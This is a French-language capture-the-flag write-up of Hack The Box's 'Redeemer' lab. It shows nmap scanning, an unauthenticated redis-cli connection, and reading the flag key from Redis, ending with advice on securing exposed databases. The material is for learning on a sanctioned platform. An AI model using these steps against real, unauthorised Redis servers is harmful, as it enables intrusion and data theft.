---
title: "Redeemer"
date: 2026-01-12
description: "Découverte du service de base de données Redis."
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, linux, database, tier-0]
slug: redeemer
---

# Introduction

**Redeemer** est la quatrième box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). Après avoir exploré Telnet, FTP et SMB, on s'attaque ici à un service de base de données très populaire : **Redis**.

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation. Respectez les règles de la plateforme.
:::

## Vidéo Walkthrough

<iframe
  width="100%"
  style={{aspectRatio: '16/9'}}
  src="https://www.youtube.com/embed/9FJurDpKBLE"
  title="Redeemer Walkthrough"
  frameBorder="0"
  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
  allowFullScreen
/>

---

## Reconnaissance

### Découverte d'hôte

```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.2.212

64 bytes from 10.129.2.212: icmp_seq=1 ttl=63 time=14.5 ms
```

### Énumération des services

Le scan classique ne trouve rien sur les 1000 ports par défaut — on scanne **tous** les ports.

```bash
┌─[user@parrot]─[~]
└──╼ $nmap -p- -sV 10.129.2.212

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Port **6379** : c'est **Redis** (version 5.0.7). Redis est un système de stockage clé-valeur en mémoire, souvent utilisé comme base de données ultra-rapide ou cache.

---

## Pré-Exploitation

### Evaluation de vulnérabilité

```bash
sudo apt install redis-tools

┌─[user@parrot]─[~]
└──╼ $redis-cli -h 10.129.2.212

10.129.2.212:6379>
```

On a un prompt **sans aucune authentification**. Faille critique de configuration.

---

## Exploitation

### Exploration de la base de données

```bash
10.129.2.212:6379> info

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

La base **db0** contient 4 clés. On liste toutes les clés.

```bash
10.129.2.212:6379> select 0
OK

10.129.2.212:6379> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

Une clé nommée **flag** — on récupère sa valeur.

```bash
10.129.2.212:6379> get flag

"03e{...}3eb"
```

La machine est **pwned** !

---

## Post-Exploitation

Redis est extrêmement puissant mais ne possède pas de couche de sécurité robuste par défaut s'il est exposé sur le réseau sans mot de passe. Toujours vérifier que vos bases de données ne sont pas accessibles publiquement sans authentification.

Script bash de récupération automatique :
[MohamedOutougane/Redeemer_Automated](https://github.com/MohamedOutougane/Redeemer_Automated)
